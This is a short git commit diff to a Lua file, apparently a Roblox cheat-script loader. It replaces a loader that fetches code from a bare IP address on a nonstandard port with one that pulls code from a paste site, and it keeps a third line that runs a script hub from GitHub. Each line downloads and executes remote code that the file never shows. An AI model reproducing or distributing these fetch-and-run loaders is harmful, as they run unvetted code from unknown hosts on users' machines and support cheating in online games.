a53c2945a957e7c16fee2254dbc17975f88b994b
scripts <nielanthonyr@gmail.com>
2025-09-06 11:52:26 +0800

    GaG.lua

--- GaG.lua
+++ GaG.lua
@@ -1,4 +1,3 @@
-ID="2eb3a306-23e4-4db1-8d35-0ab2e7e30044";
-loadstring(game:HttpGet("http://5.129.216.170:3910/cdn/loader.luau"))()
+loadstring(game:HttpGet("https://pastefy.app/uCl1cwsD/raw"))()
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ArdyBotzz/NatHub/refs/heads/master/NatHub.lua"))()
